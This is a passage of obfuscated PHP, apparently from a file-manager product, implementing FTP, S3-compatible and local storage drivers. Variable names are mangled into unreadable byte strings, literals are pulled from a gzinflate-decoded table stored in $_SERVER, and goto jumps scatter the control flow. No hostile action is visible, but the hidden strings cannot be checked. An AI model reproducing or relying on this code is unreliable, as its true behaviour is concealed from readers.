array_unique(array_to_keyvalue($Øˆè¥ß, $Ô Â´î[12], $Ô Â´î[1935])); $á£¾ë¥Ã = array_remove_value($á£¾ë¥Ã, $Ô Â´î[224]); if (!$á£¾ë¥Ã) { return; } $Ù–ıÉìã = $this->where(array($Ô Â´î[1936] => array($Ô Â´î[7], $á£¾ë¥Ã)))->select(); $Ù–ıÉìã = array_to_keyvalue($Ù–ıÉìã, $Ô Â´î[1943]); foreach ($Øˆè¥ß as &$¸Œ‡æó) { if (isset($Ù–ıÉìã[$¸Œ‡æó[$Ô Â´î[1935]]])) { $¸Œ‡æó[$Ô Â´î[1953]] = $Ù–ıÉìã[$¸Œ‡æó[$Ô Â´î[1935]]]; } } unset($¸Œ‡æó); } private function _listAppendUser(&$ÄÚ‘¼„²) { $Ùşç¸ó =& $_SERVER[ú‡®¯¨±]; $¶È§… = array_unique(array_to_keyvalue($ÄÚ‘¼„², $Ùşç¸ó[12], $Ùşç¸ó[1708])); $¶È§… = array_remove_value($¶È§…, $Ùşç¸ó[224]); if (count($¶È§…) == 0) { return; } foreach ($ÄÚ‘¼„² as $œ—‹¤Î¬) { if (isset($œ—‹¤Î¬[$Ùşç¸ó[1953]])) { $¶È§…[] = $œ—‹¤Î¬[$Ùşç¸ó[1953]][$Ùşç¸ó[1708]]; } } $éÙæº¬£ = Model($Ùşç¸ó[577])->userListInfo($¶È§…); foreach ($ÄÚ‘¼„² as &$œ—‹¤Î¬) { $œ—‹¤Î¬[$Ùşç¸ó[640]] = $éÙæº¬£[$œ—‹¤Î¬[$Ùşç¸ó[1708]]]; if (isset($œ—‹¤Î¬[$Ùşç¸ó[1953]])) { $œ—‹¤Î¬[$Ùşç¸ó[1953]][$Ùşç¸ó[640]] = $éÙæº¬£[$œ—‹¤Î¬[$Ùşç¸ó[1953]][$Ùşç¸ó[1708]]]; } } unset($œ—‹¤Î¬); } private function _listAppendMeta(&$Îáğ•Õ) { $‡ƒˆç“– =& $_SERVER[ú‡®¯¨±]; $Ç›â×²° = array_unique(array_to_keyvalue($Îáğ•Õ, $‡ƒˆç“–[12], $‡ƒˆç“–[1943])); $Ç›â×²° = array_remove_value($Ç›â×²°, $‡ƒˆç“–[224]); if (!$Ç›â×²°) { return; } foreach ($Îáğ•Õ as $ö…‘æ°Ö) { if (isset($ö…‘æ°Ö[$‡ƒˆç“–[1953]])) { $Ç›â×²°[] = $ö…‘æ°Ö[$‡ƒˆç“–[1953]][$‡ƒˆç“–[1943]]; } } $æºö¾å¤ = $this->metaList($Ç›â×²°); if (!$æºö¾å¤) { return !1; } foreach ($Îáğ•Õ as &$ö…‘æ°Ö) { $ö…‘æ°Ö[$‡ƒˆç“–[517]] = $æºö¾å¤[$ö…‘æ°Ö[$‡ƒˆç“–[1943]]]; if (isset($ö…‘æ°Ö[$‡ƒˆç“–[1953]])) { $ö…‘æ°Ö[$‡ƒˆç“–[1953]][$‡ƒˆç“–[517]] = $æºö¾å¤[$ö…‘æ°Ö[$‡ƒˆç“–[1953]][$‡ƒˆç“–[1943]]]; } } unset($ö…‘æ°Ö); } private function metaList($Ñ¬•œõß) { $äŒü²ğ¡ =& $_SERVER[ú‡®¯¨±]; if (!$Ñ¬•œõß) { return array(); } $Úéôü¤ = array($äŒü²ğ¡[1943] => array($äŒü²ğ¡[7], $Ñ¬•œõß)); $ÌÏ»ÆÌë = Model($äŒü²ğ¡[1954])->where($Úéôü¤)->select(); $ÌÏ»ÆÌë = array_to_keyvalue_group($ÌÏ»ÆÌë, $äŒü²ğ¡[1943]); foreach ($ÌÏ»ÆÌë as $û€õŠÑ« => $Ñ¾ÜÉÏ) { $ƒŞ½±„• = array(); foreach ($Ñ¾ÜÉÏ as $ù¹ÃƒŠ) { $ƒŞ½±„•[$ù¹ÃƒŠ[$äŒü²ğ¡[96]]] = $ù¹ÃƒŠ[$äŒü²ğ¡[429]]; } $ÌÏ»ÆÌë[$û€õŠÑ«] = $ƒŞ½±„•; } return $ÌÏ»ÆÌë ? $ÌÏ»ÆÌë : array(); } } goto D•§Æ¡¾ó±; f‡ø„º‹­ø: define($_SERVER[ú‡®¯¨±][0], $_SERVER[ú‡®¯¨±][1]); $_SERVER[ë§´ÖŞÆ] = explode($_SERVER[ú‡®¯¨±][2], gzinflate(substr($_SERVER[ú‡®¯¨±][3], 10, -8))); function binCheckEq($è÷µóÉğ, $…˜§ƒ÷ö) { return $è÷µóÉğ == $…˜§ƒ÷ö; } goto DÆ©õÊØÂˆ; aĞ´Ê¾Œæ: class PathDriverEDS extends PathDriverMinIO { public function __construct($¦Æ›ÕÍ¶) { parent::__construct($¦Æ›ÕÍ¶); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($©úÇ¿Ã¹) { parent::__construct($©úÇ¿Ã¹); $this->signatureVersion($_SERVER[ú‡®¯¨±][243]); } public function uploadFormData($Ğ©©ª†, $¹úÂ¡³« = 3600) { $ÜøŒÇı¶ =& $_SERVER[ú‡®¯¨±]; $ÒíÊâÄƒ = $ÜøŒÇı¶[225]; $’ñŞñä³ = $ÜøŒÇı¶[264]; $‘å‚ÒÇº = $ÜøŒÇı¶[62]; $—”üœÆ = gmdate($ÜøŒÇı¶[265]); $€Û¢¼¡à = gmdate($ÜøŒÇı¶[266]); $ÄØ¸÷¤™ = $ÜøŒÇı¶[267]; $ˆ“©µ¬• = $¹úÂ¡³« . $ÜøŒÇı¶[12]; $ Äî¢Ÿ = $ÜøŒÇı¶[268]; $îà›‚ „ = array($this->accessKey, $€Û¢¼¡à, $this->region, $‘å‚ÒÇº, $ÄØ¸÷¤™); $£Ä£‰‹¹ = implode($ÜøŒÇı¶[8], $îà›‚ „); $‚•ŞÈ¬ü = array($ÜøŒÇı¶[269] => gmdate($ÜøŒÇı¶[1381], strtotime($ÜøŒÇı¶[271])), $ÜøŒÇı¶[272] => array(array($ÜøŒÇı¶[273] => $this->bucket), array($ÜøŒÇı¶[274] => $ÒíÊâÄƒ), array($ÜøŒÇı¶[275], $ÜøŒÇı¶[276], $ÜøŒÇı¶[12]), array($ÜøŒÇı¶[275], $ÜøŒÇı¶[277], $ÜøŒÇı¶[12]), array($ÜøŒÇı¶[275], $ÜøŒÇı¶[278], $ÜøŒÇı¶[12]), array($ÜøŒÇı¶[279] => $ Äî¢Ÿ), array($ÜøŒÇı¶[280] => $£Ä£‰‹¹), array($ÜøŒÇı¶[281] => $’ñŞñä³), array($ÜøŒÇı¶[282] => $—”üœÆ), array($ÜøŒÇı¶[283] => $ˆ“©µ¬•))); $Ë‘ÚÎö = base64_encode(json_encode($‚•ŞÈ¬ü)); $ïÊŸİÄ = hash_hmac($ÜøŒÇı¶[284], $€Û¢¼¡à, $ÜøŒÇı¶[285] . $this->secret, !0); $ê‚ÜÁúÈ = hash_hmac($ÜøŒÇı¶[284], $this->region, $ïÊŸİÄ, !0); $‡‹Ä–ñİ = hash_hmac($ÜøŒÇı¶[284], $‘å‚ÒÇº, $ê‚ÜÁúÈ, !0); $Æ§ÈÓÌ‚ = hash_hmac($ÜøŒÇı¶[284], $ÄØ¸÷¤™, $‡‹Ä–ñİ, !0); $Ø¾™Ù½Ğ = hash_hmac($ÜøŒÇı¶[284], $Ë‘ÚÎö, $Æ§ÈÓÌ‚); $ÊÚè—ô™ = array($ÜøŒÇı¶[242] => $ÜøŒÇı¶[12], $ÜøŒÇı¶[286] => $ÜøŒÇı¶[12], $ÜøŒÇı¶[274] => $ÒíÊâÄƒ, $ÜøŒÇı¶[279] => $ Äî¢Ÿ, $ÜøŒÇı¶[287] => $Ë‘ÚÎö, $ÜøŒÇı¶[288] => $£Ä£‰‹¹, $ÜøŒÇı¶[289] => $’ñŞñä³, $ÜøŒÇı¶[290] => $—”üœÆ, $ÜøŒÇı¶[291] => $ˆ“©µ¬•, $ÜøŒÇı¶[292] => $Ø¾™Ù½Ğ, $ÜøŒÇı¶[198] => $this->getHost()); return $ÊÚè—ô™; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; public $config = array(); public function __construct($Åè¨¹) { parent::__construct(); if (count($Åè¨¹) > 0) { $this->_init($Åè¨¹); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($Á¸û—­) { $üÖáªÆ– =& $_SERVER[ú‡®¯¨±]; global $config; $this->appCharset = $config[$üÖáªÆ–[1407]]; $this->systemCharset = $config[$üÖáªÆ–[1408]]; if (isset($Á¸û—­[$üÖáªÆ–[1409]]) && $Á¸û—­[$üÖáªÆ–[1409]]) { $this->systemCharset = $Á¸û—­[$üÖáªÆ–[1409]]; } } public function iconvApp($Ï¤¦ùíà) { return $this->iconvTo($Ï¤¦ùíà, $this->systemCharset, $this->appCharset); } public function iconvSystem($ñ‚Âğ³Û) { return $this->iconvTo($ñ‚Âğ³Û, $this->appCharset, $this->systemCharset); } public function getPathOuter($ÇÒ‹®ü) { $¥›Ûú—À =& $_SERVER[ú‡®¯¨±]; $’Ø¥èŸ™ = $this->iconvApp($this->pathBase); $ÇÒ‹®ü = $this->iconvApp($ÇÒ‹®ü); if (substr($’Ø¥èŸ™, 0, 2) == $¥›Ûú—À[1410]) { $’Ø¥èŸ™ = BASIC_PATH . substr($’Ø¥èŸ™, 2); } if (substr($ÇÒ‹®ü, 0, 2) == $¥›Ûú—À[1410]) { $ÇÒ‹®ü = BASIC_PATH . substr($ÇÒ‹®ü, 2); } $’Ø¥èŸ™ = KodIO::clear($’Ø¥èŸ™); $ÇÒ‹®ü = KodIO::clear($ÇÒ‹®ü); $ÇÒ‹®ü = substr($ÇÒ‹®ü, strlen($’Ø¥èŸ™)); if (empty($this->pathDriver)) { return $ÇÒ‹®ü; } return $this->pathDriver . $¥›Ûú—À[8] . ltrim($ÇÒ‹®ü, $¥›Ûú—À[8]); } private function _init($Ã§úšˆ = array()) { $İì®„¡ =& $_SERVER[ú‡®¯¨±]; if (!function_exists($İì®„¡[1411])) { throw new Exception(LNG($İì®„¡[1412])); } $this->config = $Ã§úšˆ; $this->charsetReset($Ã§úšˆ); foreach ($Ã§úšˆ as $›±ÍÉÜÆ => $‡Ùƒ…üå) { if (isset($this->{$›±ÍÉÜÆ})) { $this->{$›±ÍÉÜÆ} = $‡Ùƒ…üå; } } return $this->_login($Ã§úšˆ); } private function _login($ê™„¥·ß) { $å¨Í†Š‹ =& $_SERVER[ú‡®¯¨±]; static $ĞôÍÙ‘ = array(); $ÉÇ‚Š¡à = md5(json_encode($ê™„¥·ß)); if (isset($ĞôÍÙ‘[$ÉÇ‚Š¡à])) { foreach ($ĞôÍÙ‘[$ÉÇ‚Š¡à] as $´àÜ¼İ½ => $ãÙÖŸµÎ) { $this->{$´àÜ¼İ½} = $ãÙÖŸµÎ; } return !0; } $ÁºÀÌ¸Â = parse_url(trim($this->server, $å¨Í†Š‹[8])); $this->host = $ÁºÀÌ¸Â[$å¨Í†Š‹[198]]; $ĞÆƒåæ· = isset($ÁºÀÌ¸Â[$å¨Í†Š‹[197]]) && $ÁºÀÌ¸Â[$å¨Í†Š‹[197]] == $å¨Í†Š‹[1413] ? !0 : !1; $this->scheme = $ĞÆƒåæ· ? $å¨Í†Š‹[1414] : $å¨Í†Š‹[1415]; $this->port = isset($ÁºÀÌ¸Â[$å¨Í†Š‹[199]]) ? $ÁºÀÌ¸Â[$å¨Í†Š‹[199]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $ç­¿ÆïÁ = @ftp_login($this->connect, $this->username, $this->userpass); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $»—€±ğ¨ = $this->pasv == $å¨Í†Š‹[90] ? !0 : !1; @ftp_pasv($this->connect, $»—€±ğ¨); $ĞôÍÙ‘[$ÉÇ‚Š¡à] = array($å¨Í†Š‹[1416] => $this->connect, $å¨Í†Š‹[198] => $this->host, $å¨Í†Š‹[197] => $this->scheme, $å¨Í†Š‹[199] => $this->port); return $ç­¿ÆïÁ; } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($ƒ®ÉÙÀû, $Èµ«õÙ = '', $ÕûÓª–Ü = REPEAT_RENAME) { if ($this->setContent($ƒ®ÉÙÀû, $Èµ«õÙ)) { return $this->getPathOuter($ƒ®ÉÙÀû); } return !1; } public function mkdir($î½âºÃ, $·×õƒ¿ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $î½âºÃ = $this->iconvSystem($î½âºÃ); if ($this->_isFolder($î½âºÃ) || @ftp_mkdir($this->connect, $î½âºÃ)) { return $this->getPathOuter($î½âºÃ); } if (!$this->mkdir($this->pathFather($î½âºÃ))) { return !1; } if ($î½âºÃ = @ftp_mkdir($this->connect, $î½âºÃ)) { return $this->getPathOuter($î½âºÃ); } return !1; } public function copyFile($úû«¹ì›, $ƒ­£—¡›) { if (!$this->_isconn()) { return !1; } $æ•‰õ = $this->pathThis($this->iconvSystem($úû«¹ì›)); $Íá·ïœ = $this->tempFile($æ•‰õ); $¸‰¦¸ = $this->iconvApp($Íá·ïœ); $this->download($úû«¹ì›, $¸‰¦¸); $úîƒŒÖ° = $this->upload($ƒ­£—¡›, $¸‰¦¸); $this->tempFileRemve($Íá·ïœ); return $úîƒŒÖ°; } public function moveFile($ã°â¾ÀÌ, $ÂÔÓÂ²Á) { if (!$this->_isconn()) { return !1; } $ã°â¾ÀÌ = $this->iconvSystem($ã°â¾ÀÌ); $ÂÔÓÂ²Á = $this->iconvSystem($ÂÔÓÂ²Á); $€°œŠè† = @ftp_rename($this->connect, $ã°â¾ÀÌ, $ÂÔÓÂ²Á); return $€°œŠè† ? $this->getPathOuter($ÂÔÓÂ²Á) : !1; } public function delFile($¼ÉùÜ‚Í) { if (!$this->_isconn()) { return !1; } $¼ÉùÜ‚Í = $this->iconvSystem($¼ÉùÜ‚Í); return @ftp_delete($this->connect, $¼ÉùÜ‚Í); } public function delFolder($ÕÃú˜Øˆ) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $÷Åíœ„ó = $ôâØ°¿² = array(); $this->fileList($ÕÃú˜Øˆ, $÷Åíœ„ó, $ôâØ°¿², !0); $this->listItemCache = !0; foreach ($ôâØ°¿² as $ ›çÑüø) { $âúãı¦¸ = $this->iconvSystem($ ›çÑüø[$_SERVER[ú‡®¯¨±][32]]); $×¨©“ = @ftp_delete($this->connect, $âúãı¦¸); if (!$×¨©“) { return !1; } } foreach ($÷Åíœ„ó as $âúãı¦¸) { $âúãı¦¸ = $this->iconvSystem($âúãı¦¸); $×¨©“ = @ftp_rmdir($this->connect, $âúãı¦¸); if (!$×¨©“) { return !1; } } $ÕÃú˜Øˆ = $this->iconvSystem($ÕÃú˜Øˆ); return @ftp_rmdir($this->connect, $ÕÃú˜Øˆ); } public function rename($Ü‘¨‡¶¥, $´éÅ¾ÇÛ) { $‡¤¯ë˜ =& $_SERVER[ú‡®¯¨±]; if (!$this->_isconn()) { return !1; } $®‹Øô€‡ = $this->fileNameAuto($this->pathFather($Ü‘¨‡¶¥), $´éÅ¾ÇÛ); $®‹Øô€‡ = $this->iconvSystem($®‹Øô€‡); $Ü‘¨‡¶¥ = $this->iconvSystem($Ü‘¨‡¶¥); $ÕÀ€ù­» = $this->pathFather($Ü‘¨‡¶¥); $›ÂŒ¤Šğ = rtrim($ÕÀ€ù­», $‡¤¯ë˜[8]) . $‡¤¯ë˜[8] . $®‹Øô€‡; $€æ–¹Ñó = @ftp_rename($this->connect, $Ü‘¨‡¶¥, $›ÂŒ¤Šğ); $›ÂŒ¤Šğ = $this->iconvApp($›ÂŒ¤Šğ); return $€æ–¹Ñó ? $this->getPathOuter($›ÂŒ¤Šğ) : !1; } private function folderInfo($Áƒ–ûğ›, $Ï¢ÒÏ­Ë = false) { $õğİÊš‘ =& $_SERVER[ú‡®¯¨±]; $èŒµ»ä¤ = array($õğİÊš‘[32] => $this->pathThis($Áƒ–ûğ›), $õğİÊš‘[86] => $this->getPathOuter($õğİÊš‘[8] . $Áƒ–ûğ›), $õğİÊš‘[33] => $õğİÊš‘[77]); if ($Ï¢ÒÏ­Ë) { return $èŒµ»ä¤; } $èŒµ»ä¤[$õğİÊš‘[227]] = $èŒµ»ä¤[$õğİÊš‘[87]] = 0; $èŒµ»ä¤[$õğİÊš‘[228]] = $èŒµ»ä¤[$õğİÊš‘[229]] = !0; return $èŒµ»ä¤; } private function fileInfo($è§±·¼, $¥è¬±ö³ = false, $™÷®ÈÌ = array()) { $îÓÖùœÆ =& $_SERVER[ú‡®¯¨±]; $ı„·ÂÓ› = array($îÓÖùœÆ[32] => $this->pathThis($è§±·¼), $îÓÖùœÆ[86] => $this->getPathOuter($îÓÖùœÆ[8] . $è§±·¼), $îÓÖùœÆ[33] => $îÓÖùœÆ[226], $îÓÖùœÆ[78] => isset($™÷®ÈÌ[$îÓÖùœÆ[78]]) ? $™÷®ÈÌ[$îÓÖùœÆ[78]] : 0, $îÓÖùœÆ[177] => $this->ext($è§±·¼)); if ($¥è¬±ö³) { return $ı„·ÂÓ›; } $ı„·ÂÓ›[$îÓÖùœÆ[227]] = $ı„·ÂÓ›[$îÓÖùœÆ[87]] = 0; $ı„·ÂÓ›[$îÓÖùœÆ[228]] = $ı„·ÂÓ›[$îÓÖùœÆ[229]] = !0; $›óö¸ê— = $this->iconvSystem($è§±·¼); $ı„·ÂÓ›[$îÓÖùœÆ[87]] = @ftp_mdtm($this->connect, $›óö¸ê—); if (empty($™÷®ÈÌ)) { $™÷®ÈÌ = $this->objectMeta($è§±·¼); if (!$™÷®ÈÌ) { return $ı„·ÂÓ›; } } $ı„·ÂÓ›[$îÓÖùœÆ[78]] = $™÷®ÈÌ[$îÓÖùœÆ[78]]; return $ı„·ÂÓ›; } public function size($³ö øüé) { $ÂàŒÖõ = $this->objectMeta($³ö øüé); return $ÂàŒÖõ ? $ÂàŒÖõ[$_SERVER[ú‡®¯¨±][78]] : 0; } public function info($ôÑÜŒµó) { if ($this->isFile($ôÑÜŒµó)) { return $this->fileInfo($ôÑÜŒµó, 0); } else { if ($this->isFolder($ôÑÜŒµó)) { return $this->folderInfo($ôÑÜŒµó); } } return !1; } private function fileList($¬ÆĞ²ğı, &$ªñ³Ñ˜, &$½¬†çà, $Á®Ëáë = false) { $íö±±Øş =& $_SERVER[ú‡®¯¨±]; $¬ÆĞ²ğı = $this->iconvSystem($¬ÆĞ²ğı); if (!$this->isFolder($¬ÆĞ²ğı)) { return !1; } @ftp_chdir($this->connect, $íö±±Øş[8]); $¬ÆĞ²ğı = rtrim($¬ÆĞ²ğı, $íö±±Øş[8]) . $íö±±Øş[8]; check_abort(); $Å‹ËÔÍÀ = @ftp_rawlist($this->connect, $¬ÆĞ²ğı); if (!$Å‹ËÔÍÀ) { $Å‹ËÔÍÀ = array(); } $ğ¶óééµ = array($íö±±Øş[10] => 1, $íö±±Øş[1334] => 1); foreach ($Å‹ËÔÍÀ as $ıÇ‚Â) { $‚£åÔÀ« = $this->_listItem($ıÇ‚Â); if ($‚£åÔÀ«[0] == $íö±±Øş[813]) { continue; } $ü­†í«™ = $‚£åÔÀ«[8]; if (empty($ü­†í«™) && $ü­†í«™ !== $íö±±Øş[224] || isset($ğ¶óééµ[$ü­†í«™])) { continue; } $ü­†í«™ = $this->iconvApp($¬ÆĞ²ğı . ltrim($ü­†í«™, $íö±±Øş[8])); $‡‘úèÛ = array($íö±±Øş[32] => $ü­†í«™, $íö±±Øş[33] => $íö±±Øş[226], $íö±±Øş[78] => $‚£åÔÀ«[4]); if (substr($ıÇ‚Â, 0, 1) == $íö±±Øş[1417]) { $‡‘úèÛ[$íö±±Øş[33]] = $íö±±Øş[77]; $‡‘úèÛ[$íö±±Øş[78]] = 0; } $¡èİÖ’ = $‡‘úèÛ[$íö±±Øş[33]] == $íö±±Øş[77] ? !0 : !1; $this->cacheMethodInfoSet($ü­†í«™, $¡èİÖ’, $‡‘úèÛ); if ($¡èİÖ’) { $ªñ³Ñ˜[] = $ü­†í«™; if ($Á®Ëáë) { $this->fileList($ü­†í«™, $ªñ³Ñ˜, $½¬†çà, $Á®Ëáë); } continue; } $½¬†çà[] = $‡‘úèÛ; } $this->cacheMethodInfoSet($¬ÆĞ²ğı, !0); } private function _listItem($çš¨­”) { if (empty($çš¨­”)) { return array(); } $ïŠäÎà¿ = preg_split($_SERVER[ú‡®¯¨±][1418], $çš¨­”); if (count($ïŠäÎà¿) <= 9) { return $ïŠäÎà¿; } $ïŠäÎà¿[8] = trim(substr($çš¨­”, strpos($çš¨­”, $ïŠäÎà¿[7]) + strlen($ïŠäÎà¿[7]))); return array_splice($ïŠäÎà¿, 0, 9); } public function listPath($Ñš‚Õµ, $³’Íë—§ = false) { $˜´Æì†ó =& $_SERVER[ú‡®¯¨±]; if (!$this->_isconn()) { return !1; } $¯¬²™úê = $óÎÑ†ÅŸ = array(); $this->fileList($Ñš‚Õµ, $¯¬²™úê, $óÎÑ†ÅŸ); foreach ($¯¬²™úê as $š§™ï¬’ => $¶ÓåØğ€) { $¯¬²™úê[$š§™ï¬’] = $this->folderInfo($¶ÓåØğ€, $³’Íë—§); } foreach ($óÎÑ†ÅŸ as $š§™ï¬’ => $¶ÓåØğ€) { $óÎÑ†ÅŸ[$š§™ï¬’] = $this->fileInfo($¶ÓåØğ€[$˜´Æì†ó[32]], $³’Íë—§, $¶ÓåØğ€); } return array($˜´Æì†ó[84] => $¯¬²™úê, $˜´Æì†ó[85] => $óÎÑ†ÅŸ); } public function has($İûœí©, $× ¯…å¾ = false, $Û¿ Ô±Ù = true) { $´¶ÈÌå =& $_SERVER[ú‡®¯¨±]; $ƒ™¯ÖÍ¥ = $éó´¹Ì¯ = array(); $ÒÆ»ÎÁ = $× ¯…å¾ ? !0 : !1; $this->fileList($İûœí©, $ƒ™¯ÖÍ¥, $éó´¹Ì¯, $ÒÆ»ÎÁ); if ($× ¯…å¾) { return array($´¶ÈÌå[235] => count($éó´¹Ì¯), $´¶ÈÌå[236] => count($ƒ™¯ÖÍ¥)); } if ($Û¿ Ô±Ù) { if (count($éó´¹Ì¯)) { return !0; } } else { if (count($ƒ™¯ÖÍ¥)) { return !0; } } return !1; } public function listAll($óãµè†×) { $ñ½³ö±« =& $_SERVER[ú‡®¯¨±]; if (!$this->_isconn()) { return !1; } $ôöâ†¼Ş = $£™±â Á = array(); $this->fileList($óãµè†×, $ôöâ†¼Ş, $£™±â Á, !0); $â±åó‰È = array_to_keyvalue($£™±â Á, $ñ½³ö±«[32]); foreach ($ôöâ†¼Ş as $Ú«ÀÎÒ) { if (is_string($Ú«ÀÎÒ)) { $â±åó‰È[$Ú«ÀÎÒ] = array($ñ½³ö±«[78] => 0); } } return $this->listAllFiles($óãµè†×, $â±åó‰È); } public function getContent($Î™°˜‡Ò) { if (!$this->_isconn()) { return !1; } $Î™°˜‡Ò = $this->iconvSystem($Î™°˜‡Ò); return $this->fileSubstr($Î™°˜‡Ò); } public function setContent($şêçµ…É, $¹ôË¢¦¢ = '') { if (!$this->_isconn()) { return !1; } $£Åı›öğ = $this->pathThis($this->iconvSystem($şêçµ…É)); $ëó¬Ü€µ = $this->tempFile($£Åı›öğ); file_put_contents($ëó¬Ü€µ, $¹ôË¢¦¢); $ïÀ¹½÷  = $this->upload($şêçµ…É, $this->iconvApp($ëó¬Ü€µ)); $this->tempFileRemve($ëó¬Ü€µ); return $ïÀ¹½÷ ; } public function fileSubstr($•ÍŒØß, $·Õì¾ıî = 0, $ÚÃ§ÛÒ² = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($•ÍŒØß, $·Õì¾ıî, $ÚÃ§ÛÒ²); } private function ftpRequest($’ğóÀ•², $¿¾¾ìºÍ = 0, $„Æ½ñæÈ = false) { $’ğóÀ•² = $this->iconvSystem($’ğóÀ•²); $¼Ç·¼®× = $this->scheme . $this->host . $_SERVER[ú‡®¯¨±][4] . $this->port; $—²ŸûÊ = curl_init(); curl_setopt($—²ŸûÊ, CURLOPT_URL, $¼Ç·¼®× . $this->pathEncode($’ğóÀ•²)); curl_setopt($—²ŸûÊ, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($„Æ½ñæÈ) { $š€½ùïÔ = $¿¾¾ìºÍ + $„Æ½ñæÈ - 1; curl_setopt($—²ŸûÊ, CURLOPT_RANGE, "{$¿¾¾ìºÍ}\x2d{$š€½ùïÔ}"); } curl_setopt($—²ŸûÊ, CURLOPT_RETURNTRANSFER, 1); $ä£âö•Ê = curl_exec($—²ŸûÊ); curl_close($—²ŸûÊ); return $ä£âö•Ê; } public function upload($µÈÎÁ‹, $è’Ó‹üá, $ÉŒÙ¿’ = false, $Úş¬ñÆ¼ = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($µÈÎÁ‹))) { return !1; } $µÈÎÁ‹ = $this->iconvSystem($µÈÎÁ‹); $è’Ó‹üá = $this->iconvSystem($è’Ó‹üá); $½Ò‚ˆ = ftp_nb_put($this->connect, $µÈÎÁ‹, $è’Ó‹üá, FTP_BINARY); while ($½Ò‚ˆ == FTP_MOREDATA) { $½Ò‚ˆ = ftp_nb_continue($this->connect); } if ($½Ò‚ˆ != FTP_FINISHED) { return !1; } return $this->getPathOuter($µÈÎÁ‹); } public function download($™Â¼‡²ó, $şğş¦× = '') { if (!$this->_isconn()) { return !1; } $ßë¼ú“ = $this->pathFather($şğş¦×); if (!IO::mkdir($ßë¼ú“)) { return !1; } $™Â¼‡²ó = $this->iconvSystem($™Â¼‡²ó); $şğş¦× = $this->iconvSystem($şğş¦×); $ß»¡Õ±¸ = ftp_nb_get($this->connect, $şğş¦×, $™Â¼‡²ó, FTP_BINARY); while ($ß»¡Õ±¸ == FTP_MOREDATA) { $ß»¡Õ±¸ = ftp_nb_continue($this->connect); } if ($ß»¡Õ±¸ != FTP_FINISHED) { return !1; } return $this->iconvApp($şğş¦×); } public function exist($ëû­) { return $this->isFile($ëû­) || $this->isFolder($ëû­); } public function isFile($ æŒ¹î) { return !$this->isFolder($ æŒ¹î) && $this->objectMeta($ æŒ¹î); } public function isFolder($ŞÉ¤¨‰§) { return $this->cacheMethod($_SERVER[ú‡®¯¨±][168], $ŞÉ¤¨‰§); } protected function objectMeta($‰ÏšÑµ·) { return $this->cacheMethod($_SERVER[ú‡®¯¨±][170], $‰ÏšÑµ·); } protected function _objectMeta($¥º€ªÉÓ) { $ĞÙ™ì‚ =& $_SERVER[ú‡®¯¨±]; if ($¥º€ªÉÓ == $ĞÙ™ì‚[12] || $¥º€ªÉÓ == $ĞÙ™ì‚[8]) { return array(); } if (!$this->_isconn()) { return !1; } $¥º€ªÉÓ = $this->iconvSystem($¥º€ªÉÓ); $šÚ½ôíô = array($ĞÙ™ì‚[32] => $this->iconvApp($¥º€ªÉÓ), $ĞÙ™ì‚[33] => $ĞÙ™ì‚[226], $ĞÙ™ì‚[78] => 0); @ftp_chdir($this->connect, $ĞÙ™ì‚[8]); $Ò÷ŸÔÈ‘ = @ftp_size($this->connect, $¥º€ªÉÓ); if ($Ò÷ŸÔÈ‘ != -1) { $šÚ½ôíô[$ĞÙ™ì‚[78]] = $Ò÷ŸÔÈ‘; } else { $ÔáÌ¡áÚ = @ftp_chdir($this->connect, $¥º€ªÉÓ); if (!$ÔáÌ¡áÚ) { return !1; } $šÚ½ôíô[$ĞÙ™ì‚[33]] = $ĞÙ™ì‚[77]; } return $šÚ½ôíô; } protected function _isFolder($—ô¿‡í×) { $ûÉÌ’´Æ =& $_SERVER[ú‡®¯¨±]; if ($—ô¿‡í× == $ûÉÌ’´Æ[12] || $—ô¿‡í× == $ûÉÌ’´Æ[8]) { return !0; } $Ö†¤™¸ = $this->_objectMeta($—ô¿‡í×); return isset($Ö†¤™¸[$ûÉÌ’´Æ[33]]) && $Ö†¤™¸[$ûÉÌ’´Æ[33]] == $ûÉÌ’´Æ[77] ? !0 : !1; } } goto Dê†ó‹ŒîÁ; Dê†ó‹ŒîÁ: class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($»ã¿û‡Ã) { if (substr($»ã¿û‡Ã, 0, 2) == $_SERVER[ú‡®¯¨±][1410]) { $»ã¿û‡Ã = BASIC_PATH . substr($»ã¿û‡Ã, 2); } return $»ã¿û‡Ã; } public function iconvApp($…³šÚ®Û) { $‡†îÓ°È =& $_SERVER[ú‡®¯¨±]; global $config; return $this->iconvTo($…³šÚ®Û, $config[$‡†îÓ°È[1408]], $config[$‡†îÓ°È[1407]]); } public function iconvSystem($•˜´ò€Ø) { $ö­İ­·¤ =& $_SERVER[ú‡®¯¨±]; global $config; return $this->iconvTo($•˜´ò€Ø, $config[$ö­İ­·¤[1407]], $config[$ö­İ­·¤[1408]]); } public function getPathOuter($¦ì˜ëé) { $ºøÛ£é =& $_SERVER[ú‡®¯¨±]; $íİê¸‡ = $this->iconvApp($this->pathBase); $¦ì˜ëé = $this->iconvApp($¦ì˜ëé); if (substr($íİê¸‡, 0, 2) == $ºøÛ£é[1410]) { $íİê¸‡ = BASIC_PATH . substr($íİê¸‡, 2); } if (substr($¦ì˜ëé, 0, 2) == $ºøÛ£é[1410]) { $¦ì˜ëé = BASIC_PATH . substr($¦ì˜ëé, 2); } $íİê¸‡ = KodIO::clear($íİê¸‡); $¦ì˜ëé = KodIO::clear($¦ì˜ëé); $¦ì˜ëé = substr($¦ì˜ëé, strlen($íİê¸‡)); if (empty($this->pathDriver)) { return $¦ì˜ëé; } return $this->pathDriver . $ºøÛ£é[8] . ltrim($¦ì˜ëé, $ºøÛ£é[8]); } public function 